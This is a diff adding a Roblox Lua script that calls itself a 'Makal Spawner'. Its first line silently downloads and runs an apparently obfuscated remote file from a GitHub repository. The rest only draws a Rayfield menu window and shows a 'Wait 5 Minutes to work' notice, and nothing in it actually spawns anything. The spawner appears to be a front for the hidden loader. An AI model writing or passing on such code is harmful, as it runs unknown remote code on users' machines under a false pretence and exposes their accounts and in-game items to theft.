@@ -1,0 +1,35 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/DoliScriptz/tests/refs/heads/main/Protected_3370271179496520.txt",true))()
+
+-- Load the Rayfield library
+local Rayfield = loadstring(game:HttpGet("https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/main/source.lua"))()
+
+-- Create the Main Window
+local window = Rayfield:CreateWindow({
+    Name = "Makal Spawner", -- Window name
+    LoadingTitle = "Loading...",
+    LoadingSubtitle = "Please wait...",
+    ConfigurationSaving = {
+        Enabled = true,
+        FolderName = "Rayfield",
+        FileName = "Settings"
+    },
+    Discord = {
+        Enabled = false,
+        Invite = "your_invite_code", -- Replace with your Discord invite code
+        RememberJoins = false
+    },
+    KeySystem = false, -- Set to true if you want to use a key system
+    Key = "your_key" -- Replace with your key if KeySystem is true
+})
+
+-- Notify Function
+local function notify(message)
+    Rayfield:Notify({
+        Title = "Notification",
+        Content = message,
+        Duration = 5
+    })
+end
+
+-- Show the notification
+notify("Wait 5 Minutes to work")
